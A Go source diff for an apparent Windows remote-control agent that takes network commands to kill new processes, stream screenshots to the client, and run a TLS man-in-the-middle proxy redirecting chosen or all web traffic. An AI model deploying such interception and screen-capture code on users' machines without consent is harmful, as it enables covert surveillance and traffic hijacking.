@@ -210,7 +210,7 @@ func closeNewProcesses(stopClose chan bool) {
 	}
 }
 
-func redirect(stopRedirect chan bool) {
+func redirect(source string, dest string) {
 	// Read the MITM cert and key.
 	tlsCert, err := tls.LoadX509KeyPair("demo.crt", "demo.key")
 	privateKey := tlsCert.PrivateKey.(*rsa.PrivateKey)
@@ -244,17 +244,9 @@ func redirect(stopRedirect chan bool) {
 
 			log.Printf("onRequest: %s %s", req.Method, req.URL.String())
 			fmt.Println(req.URL.Host)
-			if req.URL.Host == "www.chess.com" {
+			if req.URL.Host == source {
 				session.SetProp("blocked", true)
-			}
-			return nil, nil
-		},
-		OnResponse: func(session *gomitmproxy.Session) *http.Response {
-			log.Printf("onResponse: %s", session.Request().URL.String())
-
-			if _, ok := session.GetProp("blocked"); ok {
-				log.Printf("onResponse: was blocked")
-				redirectURL := "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+				redirectURL := dest
 				resp, err := http.Get(redirectURL)
 				if err != nil {
 					log.Fatal(err)
@@ -262,9 +254,29 @@ func redirect(stopRedirect chan bool) {
 				res := proxyutil.NewResponse(http.StatusFound, resp.Body, nil)
 				res.Header.Set("Content-Type", "text/html")
 				res.Header.Set("Location", redirectURL)
-				return res
+				return nil, res
+			} else if source == "all" {
+				req.Close = true
+				session.SetProp("blocked", true)
+				redirectURL := dest
+				resp, err := http.Get(redirectURL)
+				if err != nil {
+					log.Fatal(err)
+				}
+				res := proxyutil.NewResponse(http.StatusFound, resp.Body, nil)
+				res.Header.Set("Content-Type", "text/html")
+				res.Header.Set("Location", redirectURL)
+				time.Sleep(1 * time.Second)
+				return nil, res
 			}
+			return nil, nil
+		},
+		OnResponse: func(session *gomitmproxy.Session) *http.Response {
+			log.Printf("onResponse: %s", session.Request().URL.String())
 
+			if blocked, ok := session.GetProp("blocked"); ok && blocked.(bool) {
+				log.Printf("onResponse: was blocked")
+			}
 			return session.Response()
 		},
 	})
@@ -315,12 +327,6 @@ func redirect(stopRedirect chan bool) {
 	}
 }
 
-func waitForStopClose(stopClose chan bool) {
-	<-stopClose
-}
-func waitForStopRedirect(stopRedirect chan bool) {
-	<-stopRedirect
-}
 func stopClosing(stopClose chan bool) {
 	// Send a signal to the stop channel to stop the closing function
 	stopClose <- true
@@ -329,13 +335,17 @@ func stopClosing(stopClose chan bool) {
 	return
 }
 
-func stopRedirecting(stopRedirect chan bool) {
+func stopRedirecting() {
 	// Send a signal to the stop channel to stop the redirect function
+	fmt.Println("instop1")
 	stopRedirect1 = true
-	time.Sleep(30 * time.Millisecond)
-	fmt.Println("here")
 	runningRedirect = false
+	fmt.Println("instop2")
 	return
+}
+
+func waitForStopClose(stopClose chan bool) {
+	<-stopClose
 }
 
 func main() {
@@ -348,25 +358,24 @@ func main() {
 
 	// Create a stop channel
 	stopClose := make(chan bool)
-	stopRedirect := make(chan bool)
 	go waitForStopClose(stopClose)
-	go waitForStopRedirect(stopRedirect)
+
 	// Loop forever and handle incoming connections
 	for {
 		conn, err := listener.Accept()
 		if err != nil {
 			panic(err)
 		}
-		go handleConnection(conn, stopClose, stopRedirect)
+		go handleConnection(conn, stopClose)
 	}
 }
 
-func handleConnection(conn net.Conn, stopClose chan bool, stopRedirect chan bool) {
+func handleConnection(conn net.Conn, stopClose chan bool) {
 	defer conn.Close()
 
 	// Create a map of commands to functions
-	commands := map[string]func(args ...string){
-		"closing": func(args ...string) {
+	commands := map[string]func(args []string){
+		"closing": func(args []string) {
 			if !runningClose {
 				runningClose = true
 				go closeNewProcesses(stopClose)
@@ -374,40 +383,48 @@ func handleConnection(conn net.Conn, stopClose chan bool, stopRedirect chan bool
 				fmt.Println("Function closing is already running")
 			}
 		},
-		"redirect": func(args ...string) {
+		"redirect": func(args []string) {
 			if !runningRedirect {
+				if len(args) == 2 {
+					go redirect(args[0], args[1])
+				} else {
+					go redirect("", "")
+				}
 				runningRedirect = true
-				go redirect(stopRedirect)
 			} else {
 				fmt.Println("Function redirect is already running")
 			}
 		},
-		"screen": func(args ...string) {
+		"screen": func(args []string) {
 			go sendImages(conn)
 		},
-		"stopClosing":  func(args ...string) { stopClosing(stopClose) },
-		"stopRedirect": func(args ...string) { stopRedirecting(stopRedirect) },
+		"stopClosing":  func(args []string) { stopClosing(stopClose) },
+		"stopRedirect": func(args []string) { stopRedirecting() },
 	}
+
 	// Read commands from the client and execute the corresponding function
 	scanner := bufio.NewScanner(conn)
 	for scanner.Scan() {
-		if !scanner.Scan() {
-			// Error reading from connection, assuming connection closed
-			fmt.Println("Connection closed by client.")
-			break
-		}
 		command := scanner.Text()
-		args := strings.Split(command, ",")
 		fmt.Println(command)
-		fmt.Println(args)
-		if function, ok := commands[args[0]]; ok {
-			function(args[1:]...)
-		} else {
-			fmt.Println("Unknown command:", command)
+		parts := strings.Split(command, " ")
+		if len(parts) > 0 {
+			commandName := parts[0]
+			commandArgs := parts[1:]
+			if function, ok := commands[commandName]; ok {
+				function(commandArgs)
+			} else {
+				fmt.Println("Unknown command:", command)
+			}
 		}
 	}
 	stopClosing(stopClose)
-	stopRedirecting(stopRedirect)
+	stopRedirecting()
+
+	runningClose = false
+	runningRedirect = false
+	stopRedirect1 = false
+
 	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
 	if err != nil {
 		// Handle error
